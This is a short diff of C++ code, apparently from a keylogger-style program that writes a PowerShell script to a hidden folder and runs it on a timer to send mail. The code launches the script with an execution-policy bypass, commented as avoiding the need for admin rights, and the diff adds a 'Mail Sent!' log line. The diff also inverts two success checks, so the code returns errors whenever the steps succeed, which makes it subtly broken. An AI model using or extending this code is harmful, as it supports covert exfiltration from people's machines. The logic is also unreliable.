@@ -8,7 +8,7 @@
 #include "timer.h"
 #include "helper.h"
 
-#define SCRIPT_NAME "myScript.ps1"
+#define SCRIPT_NAME "psScript.ps1"
 
 namespace Mail
 {
@@ -104,7 +104,7 @@ namespace Mail
 
 		ok = inputOutput::makeDir(inputOutput::getOurPath(true));
 
-		if (!ok) { return -1; }
+		if (ok) { return -1; }
 
 		std::string scr_path = inputOutput::getOurPath(true) + 
 			std::string(SCRIPT_NAME);
@@ -114,7 +114,7 @@ namespace Mail
 			ok = createScript();
 		}
 			
-		if (!ok) { return -2; }
+		if (ok) { return -2; }
 
 		// Bypass PowerShell need for Admin privileges 
 		std::string param = "-ExecutionPolicy ByPass -File \"" + scr_path + 
@@ -151,7 +151,7 @@ namespace Mail
 			}
 				
 			Helper::writeLogFile("<From SendMail> Return Code: " + 
-				Helper::toString((int)exitCode));
+				Helper::toString((int)exitCode) + " (Mail Sent!)");
 		});
 
 		m_timer.repeatCount(1L);
